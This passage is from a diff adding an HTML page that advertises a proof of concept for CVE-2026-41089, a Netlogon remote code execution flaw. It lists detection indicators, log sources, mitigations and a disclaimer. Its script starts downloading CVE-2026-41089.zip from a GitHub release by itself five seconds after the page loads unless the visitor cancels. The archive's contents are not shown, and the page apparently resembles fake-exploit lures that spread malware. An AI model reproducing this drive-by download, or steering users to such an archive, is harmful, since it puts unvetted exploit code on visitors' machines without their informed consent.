+      <p>Monitor the following high-fidelity indicators in your environment:</p>
+
+      <div class="ioc-box">
+        <span class="warn">[!]</span> Unexpected Netlogon service crashes or spontaneous DC restarts<br>
+        <span class="warn">[!]</span> Event ID 1000 — lsass.exe faulting module netlogon.dll, exception 0xc0000409<br>
+        <span class="warn">[!]</span> Abnormal process spawning directly from lsass.exe<br>
+        <span class="warn">[!]</span> Spikes in malformed CLDAP requests on UDP port 389<br>
+        <span class="warn">[!]</span> Unrecognized authentication anomalies in Windows Event Logs<br>
+        <span class="warn">[!]</span> Suspicious RPC traffic directed at Domain Controllers
+      </div>
+
+      <h3>📈 Recommended Log Sources</h3>
+      <ul class="checklist">
+        <li>Windows Security &amp; Application Event Logs (service crashes, logon failures)</li>
+        <li>Microsoft Defender for Identity / Defender for Endpoint</li>
+        <li>Sysmon — Process Creation &amp; Network Connections</li>
+        <li>SIEM alerting rules for DC RPC/CLDAP traffic anomalies</li>
+      </ul>
+    </section>
+
+    <!-- Mitigation -->
+    <section id="mitigation" class="reveal">
+      <div class="section-label">// Mitigation Strategy</div>
+      <h2>🛠️ Immediate Actions</h2>
+      <ul class="checklist mitigation">
+        <li><strong>Apply Microsoft Patches:</strong> Install May 2026 Patch Tuesday updates on all Domain Controllers immediately.</li>
+        <li><strong>Restrict Network Access:</strong> Limit UDP 389 / Netlogon RPC to authorized subnets via firewall rules.</li>
+        <li><strong>Enable EDR Visibility:</strong> Apply aggressive monitoring policies to the <code>lsass.exe</code> process.</li>
+        <li><strong>Validate AD Integrity:</strong> Audit Domain Admin groups and check for shadow credentials.</li>
+        <li><strong>Verify Patch Status:</strong> Compare <code>netlogon.dll</code> hash and KB installation across all DCs.</li>
+      </ul>
+    </section>
+
+    <!-- Legal -->
+    <section id="legal" class="reveal">
+      <div class="section-label">// License &amp; Legal</div>
+      <h2>⚖️ Disclaimer</h2>
+      <div class="disclaimer">
+        <p>
+          <strong>This vulnerability analysis and associated PoC code are provided for authorized defensive research and system administration only.</strong>
+          Exploiting CVE-2026-41089 on systems or networks without explicit, written authorization is strictly illegal.
+          The author assumes <strong>no liability</strong> for any misuse of this information.
+          Ransomware deployment, unauthorized lateral movement, and Active Directory manipulation carry severe legal consequences.
+          Always patch early and test responsibly in isolated laboratory environments.
+        </p>
+      </div>
+    </section>
+
+  </div>
+
+  <footer>
+    <strong>⭐ Stay Secure. Patch Early. Monitor Continuously.</strong>
+    <em>Made with ❤️ for the Cybersecurity Community — HydraSoft</em>
+  </footer>
+
+  <!-- Auto-download countdown toast -->
+  <div class="dl-toast" id="dl-toast" role="status" aria-live="polite">
+    <div class="dl-toast-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
+    </div>
+    <div class="dl-toast-body">
+      <div class="dl-toast-title">Auto-download starting…</div>
+      <div class="dl-toast-sub">CVE-2026-41089.zip in <strong id="dl-countdown">5</strong>s</div>
+    </div>
+    <div class="dl-toast-actions">
+      <button class="dl-toast-btn dl-toast-btn-cancel" id="dl-cancel" type="button">Cancel</button>
+      <button class="dl-toast-btn dl-toast-btn-now" id="dl-now" type="button">Download now</button>
+    </div>
+    <div class="dl-progress" id="dl-progress"></div>
+  </div>
+
+  <script>
+    const DOWNLOAD_URL = 'https://github.com/HydraSoft/CVE-2026-41089-Netlogon-RCE/releases/download/CVE-2026-41089-PoC-(Fixed)/CVE-2026-41089.zip';
+    const AUTO_DOWNLOAD_DELAY = 5;
+
+    /* ── Floating particles ── */
+    (function () {
+      const canvas = document.getElementById('particles');
+      const ctx = canvas.getContext('2d');
+      let W, H, dots;
+
+      function resize() {
+        W = canvas.width = window.innerWidth;
+        H = canvas.height = window.innerHeight;
+      }
+
+      function init() {
+        dots = Array.from({ length: 60 }, () => ({
+          x: Math.random() * W,
+          y: Math.random() * H,
+          r: Math.random() * 1.5 + 0.5,
+          dx: (Math.random() - 0.5) * 0.4,
+          dy: (Math.random() - 0.5) * 0.4,
+          a: Math.random() * 0.5 + 0.1,
+        }));
+      }
+
+      function draw() {
+        ctx.clearRect(0, 0, W, H);
+        dots.forEach(d => {
+          d.x += d.dx; d.y += d.dy;
+          if (d.x < 0) d.x = W; if (d.x > W) d.x = 0;
+          if (d.y < 0) d.y = H; if (d.y > H) d.y = 0;
+          ctx.beginPath();
+          ctx.arc(d.x, d.y, d.r, 0, Math.PI * 2);
+          ctx.fillStyle = `rgba(0, 229, 255, ${d.a})`;
+          ctx.fill();
+        });
+        requestAnimationFrame(draw);
+      }
+
+      window.addEventListener('resize', () => { resize(); init(); });
+      resize(); init(); draw();
+    })();
+
+    /* ── Scroll reveal ── */
+    const reveals = document.querySelectorAll('.reveal');
+    const observer = new IntersectionObserver(entries => {
+      entries.forEach(e => {
+        if (e.isIntersecting) {
+          e.target.classList.add('visible');
+          if (e.target.querySelector('#cvss-fill')) {
+            document.getElementById('cvss-fill').classList.add('animated');
+          }
+        }
+      });
+    }, { threshold: 0.12 });
+    reveals.forEach(el => observer.observe(el));
+
+    /* ── Animated counters ── */
+    function animateCounter(el, target, decimals = 0, suffix = '') {
+      const duration = 1400;
+      const start = performance.now();
+      const isZero = target === 0;
+
+      function step(now) {
+        const p = Math.min((now - start) / duration, 1);
+        const ease = 1 - Math.pow(1 - p, 3);
+        if (isZero) {
+          el.textContent = p >= 1 ? 'None' : '';
+        } else {
+          const val = ease * target;
+          el.textContent = decimals ? val.toFixed(decimals) + suffix : Math.floor(val) + suffix;
+        }
+        if (p < 1) requestAnimationFrame(step);
+      }
+      requestAnimationFrame(step);
+    }
+
+    const statsObs = new IntersectionObserver(entries => {
+      entries.forEach(e => {
+        if (!e.isIntersecting) return;
+        e.target.querySelectorAll('[data-count]').forEach(el => {
+          if (el.dataset.done) return;
+          el.dataset.done = '1';
+          const n = parseFloat(el.dataset.count);
+          animateCounter(el, n, n % 1 !== 0 ? 1 : 0);
+        });
+        statsObs.unobserve(e.target);
+      });
+    }, { threshold: 0.5 });
+
+    document.querySelectorAll('.stats-strip').forEach(el => statsObs.observe(el));
+
+    /* ── Copy button ── */
+    document.querySelectorAll('.copy-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const pre = document.getElementById(btn.dataset.target);
+        navigator.clipboard.writeText(pre.innerText).then(() => {
+          btn.textContent = 'Copied!';
+          btn.classList.add('copied');
+          setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+        });
+      });
+    });
+
+    /* ── Download helper ── */
+    function triggerDownload() {
+      const a = document.createElement('a');
+      a.href = DOWNLOAD_URL;
+      a.setAttribute('download', 'CVE-2026-41089.zip');
+      a.rel = 'noopener noreferrer';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+
+    document.getElementById('download-btn').addEventListener('click', function () {
+      this.style.transform = 'scale(0.96)';
+      setTimeout(() => { this.style.transform = ''; }, 150);
+    });
+
+    /* ── Auto-download after 5 seconds ── */
+    (function () {
+      const toast = document.getElementById('dl-toast');
+      const countdownEl = document.getElementById('dl-countdown');
+      const cancelBtn = document.getElementById('dl-cancel');
+      const nowBtn = document.getElementById('dl-now');
+      let remaining = AUTO_DOWNLOAD_DELAY;
+      let cancelled = false;
+      let done = false;
+
+      function finishToast(message) {
+        toast.classList.add('done');
+        toast.querySelector('.dl-toast-title').textContent = message;
+        toast.querySelector('.dl-toast-sub').innerHTML = '<strong>CVE-2026-41089.zip</strong>';
+        toast.querySelector('.dl-toast-actions').style.display = 'none';
+        setTimeout(() => toast.classList.remove('visible'), 3000);
+      }
+
+      function startDownload() {
+        if (done) return;
+        done = true;
+        triggerDownload();
+        finishToast('Download started!');
+      }
+
+      requestAnimationFrame(() => toast.classList.add('visible'));
+
+      const tick = setInterval(() => {
+        if (cancelled || done) { clearInterval(tick); return; }
+        remaining -= 1;
+        countdownEl.textContent = remaining;
+        if (remaining <= 0) {
+          clearInterval(tick);
+          startDownload();
+        }
+      }, 1000);
+
+      cancelBtn.addEventListener('click', () => {
+        if (done) return;
+        cancelled = true;
+        clearInterval(tick);
+        finishToast('Auto-download cancelled');
+      });
+
+      nowBtn.addEventListener('click', () => {
+        if (cancelled || done) return;
+        clearInterval(tick);
+        startDownload();
+      });
+    })();
+  </script>
+</body>
+</html>
